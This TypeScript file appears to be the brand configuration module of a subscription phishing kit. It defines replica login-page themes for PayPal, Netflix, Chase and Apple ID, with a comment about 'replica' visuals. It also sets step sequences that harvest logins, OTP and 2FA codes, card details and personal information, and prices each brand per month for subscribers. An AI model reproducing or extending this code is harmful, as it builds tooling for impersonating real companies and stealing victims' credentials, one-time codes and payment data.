/**
 * Flow Configuration Service
 * Manages available flows (brands) and user subscriptions
 */

export interface FlowTheme {
    mode: 'light' | 'dark';
    background: {
        type: 'color' | 'image' | 'gradient';
        value: string;
    };
    layout: 'centered' | 'split' | 'simple';
    card: {
        background: string;
        border: string;
        radius: string;
        shadow: string;
        maxWidth: string;
        padding: string;
    };
    input: {
        style: 'modern' | 'material' | 'outline' | 'flat';
        activeColor: string;
        borderRadius: string;
        backgroundColor: string;
        textColor: string;
        labelBehavior: 'float' | 'top' | 'placeholder';
    };
    button: {
        background: string;
        color: string;
        borderRadius: string;
        width: 'full' | 'auto';
        style: 'flat' | 'gradient' | 'outline';
    };
    header: {
        logoUrl: string; // URL or asset path
        logoHeight: string;
        alignment: 'center' | 'left';
    };
    footer: {
        style: 'simple' | 'links' | 'hidden';
        links: { text: string; url?: string }[];
        textColor: string;
    };
}

export interface FlowConfig {
    id: string;
    name: string;
    category: 'payments' | 'streaming' | 'banking' | 'ecommerce' | 'tech';
    icon: string;           // Emoji or icon class for Admin UI
    color: string;          // Brand primary color for Admin UI
    monthlyPrice: number;   // Price in USD
    description: string;
    theme: FlowTheme;       // Theming configuration
    steps: FlowStep[];
    popular?: boolean;
}

export interface FlowStep {
    id: string;
    name: string;
    type: 'login' | 'otp' | 'card' | 'personal' | 'security' | 'verification' | 'email' | 'phone';
    required: boolean;
    order: number;
    config?: Record<string, any>;
}

export interface UserFlowSubscription {
    flowId: string;
    enabled: boolean;
    enabledAt?: number;
    sessionsThisMonth: number;
}

// Available flows with configurations
export const AVAILABLE_FLOWS: FlowConfig[] = [
    {
        id: 'paypal',
        name: 'PayPal',
        category: 'payments',
        icon: '💳',
        color: '#003087',
        monthlyPrice: 0,
        description: 'Payment verification flow',
        popular: true,
        theme: {
            mode: 'light',
            background: { type: 'color', value: '#F5F7FA' },
            layout: 'centered',
            card: {
                background: '#ffffff',
                border: '1px solid #e5e7eb',
                radius: '0.75rem',
                shadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
                maxWidth: '450px',
                padding: '2.5rem'
            },
            input: {
                style: 'modern',
                activeColor: '#003087',
                borderRadius: '0.5rem',
                backgroundColor: '#ffffff',
                textColor: '#111827',
                labelBehavior: 'float'
            },
            button: {
                background: '#003087',
                color: '#ffffff',
                borderRadius: '999px',
                width: 'full',
                style: 'flat'
            },
            header: {
                logoUrl: 'assets/logos/paypal.png',
                logoHeight: '32px',
                alignment: 'center'
            },
            footer: {
                style: 'links',
                links: [{ text: 'Contact' }, { text: 'Privacy' }, { text: 'Legal' }],
                textColor: '#6b7280'
            }
        },
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
            { id: 'card', name: 'Card Details', type: 'card', required: false, order: 3 },
            { id: 'personal', name: 'Personal Info', type: 'personal', required: false, order: 4 }
        ]
    },
    {
        id: 'netflix',
        name: 'Netflix',
        category: 'streaming',
        icon: '🎬',
        color: '#e50914',
        monthlyPrice: 10,
        description: 'Streaming account verification',
        theme: {
            mode: 'dark',
            background: { type: 'image', value: 'url("assets/bg/netflix-bg.jpg")' },
            layout: 'centered',
            card: {
                background: 'rgba(0, 0, 0, 0.75)',
                border: 'none',
                radius: '4px',
                shadow: '0 10px 15px -3px rgba(0, 0, 0, 0.5)',
                maxWidth: '440px',
                padding: '4rem 3rem'
            },
            input: {
                style: 'material',
                activeColor: '#e50914',
                borderRadius: '4px',
                backgroundColor: '#333333',
                textColor: '#ffffff',
                labelBehavior: 'float'
            },
            button: {
                background: '#e50914',
                color: '#ffffff',
                borderRadius: '4px',
                width: 'full',
                style: 'flat'
            },
            header: {
                logoUrl: 'assets/logos/netflix.png',
                logoHeight: '45px',
                alignment: 'left'
            },
            footer: {
                style: 'links',
                links: [{ text: 'Help Center' }, { text: 'Terms of Use' }, { text: 'Privacy' }],
                textColor: '#737373'
            }
        },
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'card', name: 'Payment Update', type: 'card', required: true, order: 2 }
        ]
    },
    {
        id: 'chase',
        name: 'Chase',
        category: 'banking',
        icon: '🏛️',
        color: '#117aca',
        monthlyPrice: 25,
        description: 'Chase banking verification',
        popular: true,
        theme: {
            mode: 'light',
            background: { type: 'image', value: 'url("assets/bg/chase-bg.jpg")' },
            layout: 'split',
            card: {
                background: 'rgba(255, 255, 255, 0.95)',
                border: 'none',
                radius: '0px',
                shadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1)',
                maxWidth: '400px',
                padding: '3rem'
            },
            input: {
                style: 'modern',
                activeColor: '#117aca',
                borderRadius: '0px',
                backgroundColor: '#f3f4f6',
                textColor: '#1f2937',
                labelBehavior: 'float'
            },
            button: {
                background: '#117aca',
                color: '#ffffff',
                borderRadius: '4px',
                width: 'full',
                style: 'flat'
            },
            header: {
                logoUrl: 'assets/logos/chase.png',
                logoHeight: '30px',
                alignment: 'center'
            },
            footer: {
                style: 'simple',
                links: [{ text: 'Privacy' }, { text: 'Security' }],
                textColor: '#ffffff'
            }
        },
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'security', name: 'Security Verification', type: 'security', required: true, order: 2 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 3 }
        ]
    },
    {
        id: 'apple',
        name: 'Apple ID',
        category: 'tech',
        icon: '🍎',
        color: '#a2aaad',
        monthlyPrice: 20,
        description: 'Apple ID verification',
        theme: {
            mode: 'light',
            background: { type: 'color', value: '#ffffff' },
            layout: 'centered',
            card: {
                background: '#ffffff',
                border: 'none',
                radius: '0px',
                shadow: 'none',
                maxWidth: '400px',
                padding: '2rem 0'
            },
            input: {
                style: 'outline',
                activeColor: '#0071e3',
                borderRadius: '12px',
                backgroundColor: '#ffffff',
                textColor: '#1d1d1f',
                labelBehavior: 'top'
            },
            button: {
                background: 'linear-gradient(to right, #40cbe2, #0071e3)', // Just example, Apple doesn't use gradient button usually but for "replica" visuals
                color: '#ffffff',
                borderRadius: '12px',
                width: 'full',
                style: 'gradient'
            },
            header: {
                logoUrl: 'assets/logos/apple.png',
                logoHeight: '80px', // Bigger centered icon
                alignment: 'center'
            },
            footer: {
                style: 'simple',
                links: [{ text: 'Create Apple ID' }, { text: 'Forgot ID or Password?' }],
                textColor: '#1d1d1f'
            }
        },
        steps: [
            { id: 'login', name: 'Apple ID Login', type: 'login', required: true, order: 1 },
            { id: 'otp', name: '2FA Verification', type: 'otp', required: true, order: 2 }
        ]
    }
];

// Category labels and icons
export const FLOW_CATEGORIES = {
    payments: { label: 'Payments', icon: '💳' },
    streaming: { label: 'Streaming', icon: '🎬' },
    banking: { label: 'Banking', icon: '🏦' },
    ecommerce: { label: 'E-commerce', icon: '🛒' },
    tech: { label: 'Tech', icon: '💻' }
};

// Helper functions
export function getFlowById(id: string): FlowConfig | undefined {
    return AVAILABLE_FLOWS.find(f => f.id === id);
}

export function getFlowsByCategory(category: string): FlowConfig[] {
    return AVAILABLE_FLOWS.filter(f => f.category === category);
}

export function calculateTotalPrice(enabledFlowIds: string[]): number {
    return enabledFlowIds.reduce((total, id) => {
        const flow = getFlowById(id);
        return total + (flow?.monthlyPrice || 0);
    }, 0);
}

export function getPopularFlows(): FlowConfig[] {
    return AVAILABLE_FLOWS.filter(f => f.popular);
}

export function getAllCategories(): string[] {
    return [...new Set(AVAILABLE_FLOWS.map(f => f.category))];
}
